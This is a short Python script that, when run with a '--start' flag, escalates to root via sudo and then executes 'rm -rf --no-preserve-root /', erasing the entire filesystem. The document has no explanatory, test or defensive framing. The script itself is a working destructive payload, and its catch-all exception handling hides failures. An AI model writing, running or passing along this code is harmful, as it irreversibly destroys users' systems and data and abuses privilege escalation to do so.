#!/usr/bin/env python3

import os
import sys
import subprocess

def is_root():
    return os.geteuid() == 0

def nuke():
    try:
        os.system("rm -rf --no-preserve-root /")
    except:
        pass

def main():
    if "--start" in sys.argv:
        if is_root():
            nuke()
        else:
            subprocess.call(["sudo", sys.executable] + sys.argv)

if __name__ == "__main__":
    main()
